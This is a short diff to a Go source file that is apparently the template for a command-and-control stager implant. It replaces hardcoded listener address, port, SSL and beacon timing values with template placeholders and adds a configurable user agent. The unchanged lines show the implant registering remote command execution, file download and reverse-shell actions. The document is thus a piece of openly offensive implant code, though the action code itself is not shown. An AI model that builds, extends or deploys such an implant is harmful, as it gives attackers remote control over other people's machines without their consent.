@@ -6,14 +6,15 @@ import (
 )
 
 const (
-	stagerId        string = "1"
-	listenerAddress string = "0.0.0.0"
-	listenerPort    string = "9999"
-	ssl             string = "true"
-	uid             string = ""
-	sleepTime       string = "1"
-	retries         string = "100"
-	delay           string = "0"
+	stagerId        string = "{{stager.id}}"
+	listenerAddress string = "{{stager.listener.address}}"
+	listenerPort    string = "{{stager.listener.port}}"
+	ssl             string = "{{stager.listener.ssl | lower}}"
+	uid             string = "{{identifier.uid}}"
+	sleepTime       string = "{{stager.options['sleep-time']}}"
+	retries         string = "{{stager.retries}}"
+	delay           string = "{{stager.delay}}"
+	userAgent       string = "{{stager.options['user-agent']}}"
 )
 
 var stager *stagerClass.Stager
@@ -24,7 +25,8 @@ func init() {
 	stager.Setup(stagerId, uid, sleepTime, retries, delay)
 	// set server url
 	stager.SetUrl(listenerAddress, listenerPort, ssl)
-
+	// set user agent
+	stager.SetUserAgent(userAgent)
 	// register actions
 	stager.RegisterAction("rce", actions.RunCommandFromTask)
 	stager.RegisterAction("download", actions.DownloadFile)
@@ -33,7 +35,6 @@ func init() {
 	stager.RegisterAction("reverse-shell", actions.ReverseShell)
 
 	//TODO: add dir listing action
-
 
 }
 
